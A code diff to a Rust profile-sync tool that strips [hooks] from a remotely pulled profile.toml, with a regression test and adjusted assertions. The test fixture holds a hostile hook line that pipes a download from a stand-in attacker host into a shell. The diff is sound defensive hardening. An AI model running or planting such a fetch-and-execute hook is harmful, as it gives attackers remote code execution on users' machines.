@@ -419,6 +419,30 @@ fn copy_profile_toml_without_hooks(src: &Path, dst: &Path) -> Result<()> {
     Ok(())
 }
 
+/// Write `profile.toml` from remote to local with hooks stripped and the
+/// merge strategy applied.
+///
+/// - `Theirs`: always overwrite local with the hook-stripped remote version.
+/// - `Ours`: only write if no local file exists (respects local-wins).
+/// - `Merge`: if local exists, merge JSON; if not, write hook-stripped remote.
+///   For `profile.toml` (TOML, not JSON), fall back to Theirs on conflict.
+fn copy_profile_toml_without_hooks_with_strategy(
+    remote: &Path,
+    local: &Path,
+    strategy: &MergeStrategy,
+) -> Result<()> {
+    match strategy {
+        MergeStrategy::Ours if local.exists() => {
+            // Local wins — do not overwrite with remote content.
+        }
+        _ => {
+            // Theirs, Merge (non-JSON falls back to Theirs), or Ours with no local file.
+            copy_profile_toml_without_hooks(remote, local)?;
+        }
+    }
+    Ok(())
+}
+
 fn copy_profile_from_repo(src: &Path, dst: &Path) -> Result<()> {
     copy_profile_from_repo_with_strategy(src, dst, &MergeStrategy::Theirs)
 }
@@ -434,7 +458,20 @@ fn copy_profile_from_repo_with_strategy(
     for file in SYNC_FILES {
         let s = src.join(file);
         if s.exists() {
-            copy_file_with_strategy(&s, &dst.join(file), strategy)?;
+            if *file == "profile.toml" {
+                // Strip [hooks] before writing to the local profile.
+                // The push path strips hooks when writing to the remote, but a
+                // pre-existing or bypassed remote may still contain hook commands.
+                // Stripping on the pull side guarantees that no hook from a remote
+                // source can execute locally, regardless of how the remote was populated.
+                copy_profile_toml_without_hooks_with_strategy(
+                    &s,
+                    &dst.join(file),
+                    strategy,
+                )?;
+            } else {
+                copy_file_with_strategy(&s, &dst.join(file), strategy)?;
+            }
         }
     }
 
@@ -732,6 +769,41 @@ mod tests {
     }
 
     #[test]
+    fn copy_profile_from_repo_strips_hooks_from_profile_toml() {
+        // Simulate a remote that was pushed before the push-side fix, or that
+        // bypassed the stripping — it still contains hook commands.
+        let repo_root = TempDir::new().unwrap();
+        let dst_root = TempDir::new().unwrap();
+        let repo_profile = repo_root.path().join("work");
+        std::fs::create_dir_all(&repo_profile).unwrap();
+        std::fs::write(
+            repo_profile.join("profile.toml"),
+            "[hooks]\npre_switch_in = \"curl http://evil.example/pwn | sh\"\n\nname = \"work\"\n",
+        )
+        .unwrap();
+
+        copy_profile_from_repo_with_strategy(
+            &repo_profile,
+            &dst_root.path().join("work"),
+            &MergeStrategy::Theirs,
+        )
+        .unwrap();
+
+        let contents = std::fs::read_to_string(
+            dst_root.path().join("work").join("profile.toml"),
+        )
+        .unwrap();
+        assert!(
+            !contents.contains("pre_switch_in"),
+            "pull must strip hook commands: {contents}"
+        );
+        assert!(
+            !contents.contains("evil.example"),
+            "pull must not store malicious hook payload: {contents}"
+        );
+    }
+
+    #[test]
     fn copy_profile_from_repo_only_copies_safe_files() {
         let repo_root = TempDir::new().unwrap();
         let dst_root = TempDir::new().unwrap();
@@ -922,8 +994,11 @@ mod tests {
         )
         .unwrap();
 
+        // profile.toml goes through TOML round-trip (to strip hooks), so check
+        // the semantic value rather than the raw string.
         let content = std::fs::read_to_string(local_dir.path().join("profile.toml")).unwrap();
-        assert_eq!(content, "name = \"remote\"");
+        let val: toml::Value = toml::from_str(&content).unwrap();
+        assert_eq!(val.get("name").and_then(|v| v.as_str()), Some("remote"));
     }
 
     #[test]
@@ -1013,8 +1088,10 @@ mod tests {
         )
         .unwrap();
 
+        // profile.toml goes through TOML round-trip (to strip hooks).
         let content = std::fs::read_to_string(local_dir.path().join("profile.toml")).unwrap();
-        assert_eq!(content, "name = \"remote\"");
+        let val: toml::Value = toml::from_str(&content).unwrap();
+        assert_eq!(val.get("name").and_then(|v| v.as_str()), Some("remote"));
     }
 
     #[test]
